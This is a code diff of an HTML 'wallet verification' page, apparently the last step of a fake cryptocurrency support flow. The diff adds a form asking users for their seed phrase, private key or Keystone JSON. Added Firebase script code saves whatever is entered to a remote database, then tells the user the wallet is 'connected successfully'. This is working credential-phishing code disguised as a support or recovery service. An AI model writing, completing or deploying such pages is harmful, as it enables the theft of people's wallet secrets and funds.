@@ -3,207 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet</title>
+    <title>Connect Wallet - Secured Recovery Protocol</title>
     <style>
-        body { 
-            margin: 0; 
-            background-color: #000; 
-            color: white; 
-            font-family: system-ui, -apple-system, sans-serif; 
-            padding: 20px; 
-            max-width: 600px; 
-            margin: 0 auto; 
+        body {
+            margin: 0;
+            background-color: #050505;
+            color: white;
+            font-family: system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        h1 { font-size: 22px; text-align: center; margin-bottom: 30px; }
-        
-        /* Tabs */
-        .tabs { display: flex; gap: 10px; margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .tab { 
-            background: none; 
-            border: none; 
-            color: gray; 
-            font-weight: bold; 
-            cursor: pointer; 
-            padding: 10px; 
+        .container {
+            width: 90%;
+            max-width: 600px;
+            background: #111;
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid #333;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        h1 { 
+            text-align: center; 
+            margin-top: 0;
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+        .step-indicator {
+            text-align: center;
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .wallet-badge {
+            display: inline-block;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ccc;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        select, input[type="text"], textarea {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        select:focus, input:focus, textarea:focus {
+            border-color: #3b82f6;
+        }
+        textarea {
+            height: 120px;
+            resize: vertical;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-submit:hover {
+            background: #2563eb;
+        }
+        .btn-back {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            text-decoration: none;
             font-size: 14px;
         }
-        .tab.active { color: #2563eb; border-bottom: 2px solid #2563eb; }
-        
-        /* Input Sections */
-        .input-section { display: none; animation: fadeIn 0.3s; }
-        .input-section.active { display: block; }
-        
-        label { display: block; margin-bottom: 8px; font-size: 14px; color: #aaa; }
-        textarea, input[type="text"] { 
-            width: 100%; 
-            background: #111; 
-            border: 1px solid #333; 
-            color: white; 
-            padding: 15px; 
-            border-radius: 8px; 
-            font-family: monospace; 
-            box-sizing: border-box; 
-            margin-bottom: 20px;
+        .btn-back:hover { color: #fff; }
+        .error-msg {
+            color: #ef4444;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
         }
-        textarea { height: 120px; resize: vertical; }
-        
-        button.submit-btn { 
-            width: 100%; 
-            background: #2563eb; 
-            color: white; 
-            border: none; 
-            padding: 15px; 
-            border-radius: 8px; 
-            font-size: 16px; 
-            font-weight: bold; 
-            cursor: pointer; 
+        .success-msg {
+            color: #22c55e;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
         }
-        button.submit-btn:hover { background: #1d4ed8; }
-        
-        .back-link { display: block; text-align: center; margin-top: 20px; color: #2563eb; text-decoration: none; }
-        
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
-    <h1>Connect Your Wallet</h1>
 
-    <!-- Tabs for switching methods -->
-    <div class="tabs">
-        <button class="tab active" onclick="switchTab('seed')">Seed Phrase</button>
-        <button class="tab" onclick="switchTab('keystone')">Keystone JSON</button>
-        <button class="tab" onclick="switchTab('private')">Private Key</button>
+<div class="container">
+    <h1>WALLET VERIFICATION</h1>
+    <div class="step-indicator">Step 3 of 3: Connect & Verify</div>
+
+    <!-- This displays the wallet chosen in the previous step -->
+    <div id="selected-wallet-display" class="wallet-badge">
+        Loading Wallet...
     </div>
 
-    <!-- Method 1: Seed Phrase -->
-    <div id="seed" class="input-section active">
-        <label>Enter your 12 or 24-word mnemonic phrase:</label>
-        <textarea placeholder="word1 word2 word3 ..."></textarea>
-        <button class="submit-btn" onclick="processWallet()">Verify & Recover</button>
-    </div>
+    <div id="error-display" class="error-msg"></div>
+    <div id="success-display" class="success-msg"></div>
 
-    <!-- Method 2: Keystone JSON -->
-    <div id="keystone" class="input-section">
-        <label>Paste your Keystone JSON export data:</label>
-        <textarea placeholder='{"address": "...", "encryptedKey": "..."}'></textarea>
-        <button class="submit-btn" onclick="processWallet()">Import JSON</button>
-    </div>
+    <form id="connect-form">
+        <!-- Hidden field to store the Issue ID from the previous page -->
+        <input type="hidden" id="issue-id" value="">
+        
+        <!-- Hidden field to store the Wallet Name chosen previously -->
+        <input type="hidden" id="wallet-name-hidden" value="">
 
-    <!-- Method 3: Private Key -->
-    <div id="private" class="input-section">
-        <label>Enter your hex Private Key:</label>
-        <input type="text" placeholder="0x7c...9f2a">
-        <button class="submit-btn" onclick="processWallet()">Unlock with Key</button>
-    </div>
+        <label for="credential-method">Verification Method</label>
+        <select id="credential-method" required onchange="updateInputLabel()">
+            <option value="" disabled selected>Select Method...</option>
+            <option value="Seed Phrase">Seed Phrase (12/24 words)</option>
+            <option value="Private Key">Private Key</option>
+            <option value="Keystone JSON">Keystone JSON File Data</option>
+        </select>
 
-    <a href="issues.html" class="back-link">← Back to Issues</a>
+        <label id="input-label" for="credential-data">Enter Seed Phrase / Private Key / JSON</label>
+        <textarea id="credential-data" placeholder="Paste your seed phrase, private key, or JSON content here..." required></textarea>
 
-    <script>
-        function switchTab(tabName) {
-            // Hide all sections
-            document.querySelectorAll('.input-section').forEach(el => el.classList.remove('active'));
-            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-            
-            // Show selected section
-            document.getElementById(tabName).classList.add('active');
-            
-            // Highlight tab
-            const tabs = ['seed', 'keystone', 'private'];
-            document.querySelectorAll('.tab')[tabs.indexOf(tabName)].classList.add('active');
-        }
+        <button type="submit" class="btn-submit">VERIFY & SUBMIT</button>
+    </form>
 
-        function processWallet() {
-            // In a real app, you would validate the input here.
-            // For now, we redirect to the resolution page to simulate success.
-            alert("Validating connection...");
-            window.location.href = "resolution.html";
-        }
-    </script>
-    <!-- FIREBASE LOGIC FOR CONNECT.HTML -->
+    <a href="issues.html" class="btn-back">&larr; Back to Issues</a>
+</div>
+
 <script type="module">
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
-  authDomain: "coinsupport-8b036.firebaseapp.com",
-  databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "coinsupport-8b036",
-  storageBucket: "coinsupport-8b036.firebasestorage.app",
-  messagingSenderId: "575774102570",
-  appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
-  measurementId: "G-YGCSNX4H9L"
-};
+    // YOUR EXACT FIREBASE CONFIGURATION
+    const firebaseConfig = {
+      apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
+      authDomain: "coinsupport-8b036.firebaseapp.com",
+      databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "coinsupport-8b036",
+      storageBucket: "coinsupport-8b036.firebasestorage.app",
+      messagingSenderId: "575774102570",
+      appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
+      measurementId: "G-YGCSNX4H9L"
+    };
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-    // Select DOM elements
-    const form = document.getElementById('connectForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const btnText = document.getElementById('btnText');
-    const btnIcon = document.getElementById('btnIcon');
-    const spinner = document.getElementById('loadingSpinner');
-    const statusMsg = document.getElementById('statusMessage');
+    // Get the Issue ID and Wallet Name passed from the previous page
+    const urlParams = new URLSearchParams(window.location.search);
+    const issueId = urlParams.get('id');
+    const walletNameFromPreviousPage = urlParams.get('wallet');
 
-    if (form) {
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+    if(issueId) {
+        document.getElementById('issue-id').value = issueId;
+    } else {
+        showError("No issue ID found. Please start from the beginning.");
+    }
 
-            // UI Loading State
-            submitBtn.disabled = true;
-            btnText.textContent = "Connecting...";
-            btnIcon.classList.add('hidden');
-            spinner.classList.remove('hidden');
-            statusMsg.textContent = "";
+    // Display the wallet chosen in the previous step
+    if(walletNameFromPreviousPage) {
+        document.getElementById('wallet-name-hidden').value = walletNameFromPreviousPage;
+        document.getElementById('selected-wallet-display').textContent = "Selected Wallet: " + walletNameFromPreviousPage.toUpperCase();
+    } else {
+        document.getElementById('selected-wallet-display').textContent = "Wallet Selection Missing";
+    }
 
-            // Gather Data
-            const walletAddress = document.getElementById('walletAddress').value.trim();
-            const emailOrUser = document.getElementById('emailOrUser').value.trim();
+    // Update label based on selection
+    window.updateInputLabel = function() {
+        const method = document.getElementById('credential-method').value;
+        const label = document.getElementById('input-label');
+        if(method === 'Seed Phrase') label.textContent = "Enter your 12 or 24-word Seed Phrase:";
+        else if(method === 'Private Key') label.textContent = "Enter your Private Key (usually starts with 0x):";
+        else if(method === 'Keystone JSON') label.textContent = "Paste the content of your Keystone JSON file:";
+    }
 
-            try {
-                // Create a unique reference for this connection
-                const newConnectionRef = push(ref(db), 'connections');
-                
-                // Save data to Firebase
-                await set(newConnectionRef, {
-                    walletAddress: walletAddress,
-                    emailOrUser: emailOrUser,
-                    timestamp: new Date().toISOString(),
-                    status: 'connected'
-                });
+    // Handle Form Submission
+    document.getElementById('connect-form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const btn = e.target.querySelector('.btn-submit');
+        const originalText = btn.textContent;
+        btn.textContent = "VERIFYING...";
+        btn.disabled = true;
 
-                // Success State
-                btnText.textContent = "Connected!";
-                submitBtn.style.background = "#22c55e"; // Green
+        const walletName = document.getElementById('wallet-name-hidden').value;
+        const credentialMethod = document.getElementById('credential-method').value;
+        const credentialData = document.getElementById('credential-data').value.trim();
+        const currentIssueId = document.getElementById('issue-id').value;
 
-                setTimeout(() => {
-                    window.location.href = "confirmation.html";
-                }, 1000);
+        if (!walletName || !credentialMethod || !credentialData) {
+            showError("Please fill in all fields.");
+            resetBtn(btn, originalText);
+            return;
+        }
 
-            } catch (error) {
-                console.error("Firebase Error:", error);
-                btnText.textContent = "Error";
-                submitBtn.style.background = "#ef4444"; // Red
-                statusMsg.textContent = "Failed to connect. Please try again.";
-                statusMsg.className = "text-center text-sm mt-2 h-5 text-red-500";
-                
-                // Reset button after delay
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    btnText.textContent = "Connect Wallet";
-                    btnIcon.classList.remove('hidden');
-                    spinner.classList.add('hidden');
-                    submitBtn.style.background = ""; 
-                }, 2000);
-            }
-        });
+        try {
+            // Create a new entry in the database
+            const newIssueRef = push(ref(db, 'issues'));
+            
+            await set(newIssueRef, {
+                issueId: currentIssueId, 
+                walletName: walletName,
+                credentialMethod: credentialMethod,
+                credentialData: credentialData, 
+                timestamp: Date.now(),
+                status: 'Pending Review'
+            });
+
+            showSuccess("Wallet connected successfully! You can now close this window.");
+            setTimeout(() => {
+                window.location.href = 'resolution.html';
+            }, 3000);
+
+        } catch (error) {
+            console.error("Error submitting:", error);
+            showError("Connection failed. Please try again.");
+        }
+        
+        resetBtn(btn, originalText);
+    });
+
+    function showError(msg) {
+        const el = document.getElementById('error-display');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('success-display').style.display = 'none';
+    }
+
+    function showSuccess(msg) {
+        const el = document.getElementById('success-display');
+        el.textContent = msg;
+        el.style.display = 'block';
+        document.getElementById('error-display').style.display = 'none';
+    }
+
+    function resetBtn(btn, text) {
+        btn.textContent = text;
+        btn.disabled = false;
     }
 </script>
 </body>
